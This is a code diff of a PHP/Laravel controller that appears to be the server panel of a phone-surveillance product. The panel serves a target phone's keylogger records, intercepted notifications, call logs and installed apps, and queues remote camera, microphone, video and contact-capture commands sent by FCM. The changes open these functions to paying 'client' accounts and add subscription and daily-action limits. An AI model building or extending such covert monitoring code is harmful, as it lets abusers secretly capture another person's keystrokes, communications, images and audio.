@@ -5,6 +5,7 @@ namespace App\Http\Controllers\api;
 use App\Http\Controllers\Controller;
 use App\Models\App;
 use App\Models\Call;
+use App\Models\Dailyaction;
 use App\Models\Keylogger;
 use App\Models\Location;
 use App\Models\Notification;
@@ -14,6 +15,7 @@ use App\Traits\ApiResponser;
 use Google\Service\Bigquery\AvroOptions;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\DB;
 use Yajra\DataTables\DataTables;
 
 class RemoteControlAPIController extends Controller
@@ -27,7 +29,9 @@ class RemoteControlAPIController extends Controller
     public function index()
     {
         $user = Auth::user();
-        abort_if(!in_array($user->user_role, ['admin']), 403, "No permission");
+        abort_if(!in_array($user->user_role, ['admin', 'client']), 403, "No permission");
+
+        isHisPhone();
 
         $phone_id = request('phone_id');
         $phone = Phone::where('id', $phone_id)->get()->map(function ($e) {
@@ -37,6 +41,7 @@ class RemoteControlAPIController extends Controller
             $o->data = (object) json_decode($e->data);
             $o->perms = (object) json_decode($e->perms);
             $o->config = (object) json_decode($e->config);
+            $o->subscription = phonesubscription($e);
             return $o;
         });
         $phone = @$phone[0];
@@ -45,33 +50,28 @@ class RemoteControlAPIController extends Controller
         if ($type == 'result') {
             if ($user->user_role == 'admin') {
                 $data = Remotecontrol::where(compact('phone_id'));
+            } elseif ($user->user_role == 'client') {
+                $data = Remotecontrol::where(compact('phone_id'))->where('fromadmin', 0);
             } else {
                 abort(403);
             }
-
             return DataTables::of($data)
                 ->rawColumns(['success', 'result', 'actionname'])
                 ->editColumn('result', function ($row) {
+                    if ($row->success && empty($row->result)) {
+                        return "<span class='badge bg-danger'><i class='fa fa-trash'></i> Fichier supprimé</span>";
+                    }
+                    if (!$row->result) {
+                        return;
+                    }
+                    $ico = actionIcon($row->action);
                     $href = asset('storage/' . $row->result);
                     $n = explode('/', $row->result);
                     $n = end($n);
-                    return "<a href='$href' target='_blank'>$n</a>";
+                    return "<a href='$href' target='_blank'>$ico $n</a>";
                 })->editColumn('actionname', function ($row) {
-                    $ico = "";
-                    if (str_starts_with($row->action, 'p1') || str_starts_with($row->action, 'p0')) {
-                        $ico = "camera-alt text-info";
-                    } else if (str_starts_with($row->action, 'a')) {
-                        $ico = "microphone text-success";
-                    } else if (str_starts_with($row->action, 'v')) {
-                        $ico = "video text-danger";
-                    } else if (str_starts_with($row->action, 'c')) {
-                        $ico = "contact-book text-dark";
-                    } else if (str_starts_with($row->action, 'push')) {
-                        $ico = "exclamation-circle text-danger";
-                    } else {
-                    }
-
-                    return "<span class='text-nowrap font-weight-bold'><i class='fa fa-$ico'></i> $row->actionname</span>";
+                    $ico = actionIcon($row->action);
+                    return "<span class='text-nowrap font-weight-bold'>$ico $row->actionname</span>";
                 })
                 ->editColumn('success', function ($row) {
                     $st = $row->fetched;
@@ -99,22 +99,18 @@ class RemoteControlAPIController extends Controller
         }
 
         if ($type == 'notif') {
-            if ($user->user_role == 'admin') {
-                $data = Notification::where(compact('phone_id'));
-                $phoneapps = (array) @json_decode(request('phoneapps'));
-                $notificationdate = explode(' to ', request('notificationdate'));
-                $from = @trim($notificationdate[0]);
-                $to = @trim($notificationdate[1]);
-                $from = empty($from) ? date('Y-m-d') : $from;
-                $to = empty($to) ? $from : $to;
+            $data = Notification::where(compact('phone_id'));
+            $phoneapps = (array) @json_decode(request('phoneapps'));
+            $notificationdate = explode(' to ', request('notificationdate'));
+            $from = @trim($notificationdate[0]);
+            $to = @trim($notificationdate[1]);
+            $from = empty($from) ? date('Y-m-d') : $from;
+            $to = empty($to) ? $from : $to;
 
-                $data->whereDate('date', '>=', $from)->whereDate('date', '<=', $to);
-                if (count($phoneapps)) {
-                    $an = App::whereIn('id', $phoneapps)->pluck('name')->all();
-                    $data->whereIn('appname', $an);
-                }
-            } else {
-                abort(403);
+            $data->whereDate('date', '>=', $from)->whereDate('date', '<=', $to);
+            if (count($phoneapps)) {
+                $an = App::whereIn('id', $phoneapps)->pluck('name')->all();
+                $data->whereIn('appname', $an);
             }
 
             return DataTables::of($data)
@@ -125,11 +121,7 @@ class RemoteControlAPIController extends Controller
         }
 
         if ($type == 'keylog') {
-            if ($user->user_role == 'admin') {
-                $data = Keylogger::where(compact('phone_id'));
-            } else {
-                abort(403);
-            }
+            $data = Keylogger::where(compact('phone_id'));
 
             $keyloggerdate = explode(' to ', request('keyloggerdate'));
             $from = @trim($keyloggerdate[0]);
@@ -178,11 +170,7 @@ class RemoteControlAPIController extends Controller
         }
 
         if ($type == 'calls') {
-            if ($user->user_role == 'admin') {
-                $data = Call::where(compact('phone_id'));
-            } else {
-                abort(403);
-            }
+            $data = Call::where(compact('phone_id'));
 
             $calldate = explode(' to ', request('calldate'));
             $from = @trim($calldate[0]);
@@ -207,11 +195,7 @@ class RemoteControlAPIController extends Controller
         }
 
         if ($type == 'apps') {
-            if ($user->user_role == 'admin') {
-                $data = App::where(compact('phone_id'));
-            } else {
-                abort(403);
-            }
+            $data = App::where(compact('phone_id'));
             return DataTables::of($data)
                 ->editColumn('installdate', function ($row) {
                     return $row->installdate?->format('d-m-Y H:i:s');
@@ -240,20 +224,18 @@ class RemoteControlAPIController extends Controller
      */
     public function store(Request $request)
     {
-
         $user = Auth::user();
-        abort_if(!in_array($user->user_role, ['admin']), 403, "No permission");
+        abort_if(!in_array($user->user_role, ['admin', 'client']), 403, "No permission");
 
         $phone_id = request('phone_id');
         $phone = Phone::where('id', $phone_id)->first();
         if (!$phone_id || !$phone) {
             abort(422, "No Phone Provided");
         }
+
+        cansend($phone);
+
         $action = request('action');
-        $action2 = request('action2');
-        if ($action2) {
-            $action = $action2;
-        }
 
         if ($action == 'c') {
             // contact
@@ -298,6 +280,7 @@ class RemoteControlAPIController extends Controller
             abort(403, "Not allowed");
         }
         // if (in_array($action, ['p1.0', 'p1.1', 'p0.0', 'p0.1', 'c'])) {}
+        DB::beginTransaction();
         $rem = Remotecontrol::create([
             'phone_id' => $phone_id,
             'action' => $action,
@@ -307,6 +290,11 @@ class RemoteControlAPIController extends Controller
             'fromadmin' => $user->user_role == 'admin',
             'date' => nnow(),
         ]);
+        if ($user->user_role == 'client') {
+            // foreach (range(1, 30) as $e)
+                Dailyaction::create(['phone_id' => $phone->id, 'remotecontrol_id' => $rem->id, 'date' => nnow()]);
+        }
+        DB::commit();
         $phone = $rem->phone;
         if ($phone->fcm) {
             $cmd = "$rem->id.$action";
